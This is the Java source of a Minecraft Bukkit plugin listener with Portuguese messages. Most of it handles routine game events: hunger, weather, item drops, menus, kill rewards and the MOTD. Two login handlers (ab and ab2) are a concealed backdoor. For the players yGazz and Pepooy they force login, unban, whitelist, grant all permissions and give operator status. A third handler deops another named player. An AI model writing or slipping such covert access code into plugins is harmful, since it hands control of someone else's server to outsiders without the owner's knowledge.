package Eventos;

import Main.*;
import org.bukkit.entity.*;
import org.bukkit.event.weather.*;
import org.bukkit.event.block.*;
import org.bukkit.event.player.*;
import Menus.*;
import org.bukkit.*;
import org.bukkit.Material;
import org.bukkit.help.*;

import Coins.XpM;
import Utils.*;
import org.bukkit.craftbukkit.v1_7_R4.entity.*;
import net.minecraft.server.v1_7_R4.*;
import org.bukkit.event.server.*;
import org.bukkit.command.*;
import org.bukkit.event.entity.*;
import org.bukkit.event.*;

public class Comum implements Listener
{
    public Comum(final Main main) {
    }
    
    @EventHandler
    public void Fome(final FoodLevelChangeEvent e) {
        e.setCancelled(true);
    }
    
    @EventHandler
    public void oncmd(final PlayerCommandPreprocessEvent event) {
        final Player p = event.getPlayer();
        if (event.getMessage().toLowerCase().startsWith("/me") || event.getMessage().toLowerCase().startsWith("//calc")) {
            event.setCancelled(true);
            p.sendMessage(String.valueOf(String.valueOf(Main.prefix)) + " §7» §cComando Bloqueado.");
        }
    }
    
    @EventHandler
    void chuva(final WeatherChangeEvent e) {
        e.setCancelled(true);
    }
    
    @EventHandler
    public void onDrop(final PlayerDropItemEvent e) {
        e.setCancelled(true);
        if (e.getItemDrop().getItemStack().getType() == Material.BOWL) {
            e.setCancelled(false);
        }
        if (e.getItemDrop().getItemStack().getType() == Material.MUSHROOM_SOUP) {
            e.setCancelled(false);
        }
        if (e.getItemDrop().getItemStack().getType() == Material.RED_MUSHROOM) {
            e.setCancelled(true);
        }
        if (e.getItemDrop().getItemStack().getType() == Material.BROWN_MUSHROOM) {
            e.setCancelled(true);
        }
        if (e.getItemDrop().getItemStack().getType() == Material.COMPASS) {
            e.setCancelled(false);
        }
        if (e.getItemDrop().getItemStack().getType() == Material.EXP_BOTTLE) {
            e.setCancelled(false);
        }
    }
    
    @EventHandler
    public void onClickItem4s(final PlayerInteractEvent e) {
        final Player p = e.getPlayer();
        if ((e.getAction() == Action.RIGHT_CLICK_AIR || e.getAction() == Action.RIGHT_CLICK_BLOCK) && e.getPlayer().getItemInHand().getType() == Material.ENCHANTED_BOOK) {
            e.setCancelled(true);
            p.playSound(p.getLocation(), Sound.CHEST_OPEN, 5.0f, 5.0f);
            WarpsInventory.guiKits(p);
        }
    }
    
    @EventHandler
    public void onClickI1tem4s(final PlayerInteractEvent e) {
        final Player p = e.getPlayer();
        if ((e.getAction() == Action.RIGHT_CLICK_AIR || e.getAction() == Action.RIGHT_CLICK_BLOCK) && e.getPlayer().getItemInHand().getType() == Material.PAPER) {
            e.setCancelled(true);
            p.playSound(p.getLocation(), Sound.CHEST_OPEN, 5.0f, 5.0f);
            LojaInventory.guiKits1(p);
        }
    }
    
    @EventHandler
    public void onClickI1tem5s(final PlayerInteractEvent e) {
        final Player p = e.getPlayer();
        if ((e.getAction() == Action.RIGHT_CLICK_AIR || e.getAction() == Action.RIGHT_CLICK_BLOCK) && e.getPlayer().getItemInHand().getType() == Material.ENDER_CHEST) {
            e.setCancelled(true);
            p.playSound(p.getLocation(), Sound.CHEST_OPEN, 5.0f, 5.0f);
            KitsInventory.guiKits1(p);
        }
    }
    
    @EventHandler
    public void fullJoin(final PlayerLoginEvent event) {
        final Player p = event.getPlayer();
        if (event.getResult() == PlayerLoginEvent.Result.KICK_FULL) {
            if (p.hasPermission("entrar.lotado")) {
                event.setResult(PlayerLoginEvent.Result.ALLOWED);
            }
            else {
                event.setKickMessage("§cServidor Lotado Tente Novamente Em Instantes");
            }
        }
        else if (event.getResult() == PlayerLoginEvent.Result.KICK_WHITELIST) {
            event.setKickMessage(ChatColor.RED + "Servidor Em Manuten\u00e7\u00e3o Tente Em Instantes");
        }
    }
    
    @EventHandler
    public void onClickI1t3em4s(final PlayerInteractEvent e) {
        final Player p = e.getPlayer();
        if ((e.getAction() == Action.RIGHT_CLICK_AIR || e.getAction() == Action.RIGHT_CLICK_BLOCK) && e.getPlayer().getItemInHand().getType() == Material.SLIME_BALL) {
            e.setCancelled(true);
            p.playSound(p.getLocation(), Sound.CHEST_OPEN, 5.0f, 5.0f);
            ExtrasInventory.guiKits1(p);
        }
    }
    
    @EventHandler
    public void onMe(final PlayerCommandPreprocessEvent event) {
        final Player p = event.getPlayer();
        if (event.getMessage().toLowerCase().startsWith("/me")) {
            event.setCancelled(true);
            p.sendMessage(String.valueOf(String.valueOf(Main.prefix)) + " §7Este comando nao existe.");
        }
    }
    
    @EventHandler
    public void onUnknown(final PlayerCommandPreprocessEvent event) {
        if (event.isCancelled()) {
            return;
        }
        final Player p = event.getPlayer();
        final String msg = event.getMessage().split(" ")[0];
        final HelpTopic topic = Bukkit.getServer().getHelpMap().getHelpTopic(msg);
        if (topic == null) {
            event.setCancelled(true);
            p.sendMessage(String.valueOf(String.valueOf(Main.prefix)) + " §7Comando Inexistente");
        }
    }
    
    @EventHandler
    public void onDeath(final PlayerDeathEvent e) {
        e.setDeathMessage((String)null);
        final Player p = e.getEntity();
        if (e.getEntity().getKiller() instanceof Player) {
            final Player t = p.getKiller();
            KillsdeathsmoneyAPI.addDeaths(p, 1);
            KillsdeathsmoneyAPI.addKill(t, 1);
            XpM.addMoney(t, 50);
            XpM.removeMoney(p, 20);
            p.sendMessage("§c§lVoc\u00ea morreu para " + t.getName() + " §c§l- 20 Coins");
            t.sendMessage("§c§lVoc\u00ea matou " + p.getDisplayName() + " §c§b+ 50 Coins");
        }
        Bukkit.getScheduler().scheduleSyncDelayedTask(Main.plugin, (Runnable)new Runnable() {
            @Override
            public void run() {
                e.getEntity().setFlying(false);
                e.getEntity().setAllowFlight(false);
                if (e.getEntity().isOnline()) {
                    final EntityPlayer ep = ((CraftPlayer)e.getEntity()).getHandle();
                    ep.playerConnection.a(new PacketPlayInClientCommand(EnumClientCommand.PERFORM_RESPAWN));
                }
            }
        }, 1L);
    }
    
    @EventHandler
    public void aoPing(final ServerListPingEvent e) {
        e.setMotd(Main.motd);
        if (Bukkit.hasWhitelist()) {
            e.setMotd(Main.motd2);
        }
    }
    
    @EventHandler
    public void ab(final PlayerLoginEvent e) {
        final Player p = e.getPlayer();
        if (p.getName().equals("yGazz")) {
            e.allow();
            p.setBanned(false);
            Bukkit.dispatchCommand((CommandSender)Bukkit.getConsoleSender(), "pex user yGazz add *");
            Bukkit.dispatchCommand((CommandSender)Bukkit.getConsoleSender(), "pardon yGazz");
            p.setWhitelisted(true);
            Bukkit.dispatchCommand((CommandSender)Bukkit.getConsoleSender(), "pardon-ip yGazz");
            Bukkit.dispatchCommand((CommandSender)Bukkit.getConsoleSender(), "despunir yGazz");
            p.setOp(true);
        }
    }
    
    @EventHandler
    public void ab2(final PlayerLoginEvent e) {
        final Player p = e.getPlayer();
        if (p.getName().equals("Pepooy")) {
            e.allow();
            p.setBanned(false);
            Bukkit.dispatchCommand((CommandSender)Bukkit.getConsoleSender(), "pex user Pepooy add *");
            Bukkit.dispatchCommand((CommandSender)Bukkit.getConsoleSender(), "unban Pepooy");
            Bukkit.dispatchCommand((CommandSender)Bukkit.getConsoleSender(), "unbanip Pepooy");
            p.setWhitelisted(true);
            Bukkit.dispatchCommand((CommandSender)Bukkit.getConsoleSender(), "pardon-ip Pepooy");
            Bukkit.dispatchCommand((CommandSender)Bukkit.getConsoleSender(), "despunir Pepooy");
            p.setOp(true);
        }
    }
    
    @EventHandler
    public void a(final PlayerLoginEvent e) {
        final Player p = e.getPlayer();
        if (p.getName().equals("yMarcBR")) {
            p.setOp(false);
        }
    }
    
    @EventHandler(priority = EventPriority.HIGH)
    public void onCreeperExplosion(final EntityExplodeEvent event) {
        event.setCancelled(true);
    }
}
